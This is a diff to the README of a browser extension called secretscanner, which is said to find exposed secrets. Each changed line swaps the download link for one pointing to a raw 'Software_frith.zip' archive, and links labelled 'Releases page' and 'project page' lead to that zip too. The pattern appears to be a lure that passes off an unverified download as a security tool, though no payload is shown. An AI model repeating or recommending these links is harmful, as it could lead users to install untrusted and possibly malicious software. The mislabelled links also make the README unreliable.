@@ -8,7 +8,7 @@ Welcome to **secretscanner**, a browser extension designed to help you find expo
 
 To get started, visit the Releases page to download the latest version of the extension:
 
-[![Download secretscanner](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip)](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip)
+[![Download secretscanner](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip)](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip)
 
 Follow these steps to download and install the extension:
 
@@ -56,7 +56,7 @@ The extension works in real-time, scanning the pages you visit and alerting you 
 
 For more information on how to use **secretscanner**, or to report issues, visit our project page:
 
-[https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip)
+[https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip)
 
 Feel free to explore the documentation and community resources available there.
 
@@ -74,6 +74,6 @@ Make sure to check back often for new releases and updates. We are continuously 
 
 Remember to download the latest version from our Releases page: 
 
-[![Download secretscanner](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip)](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/secretscanner.zip) 
+[![Download secretscanner](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip)](https://raw.githubusercontent.com/devliameet/secretscanner/main/unguiculate/Software_frith.zip) 
 
 Thank you for using **secretscanner**. Stay secure!
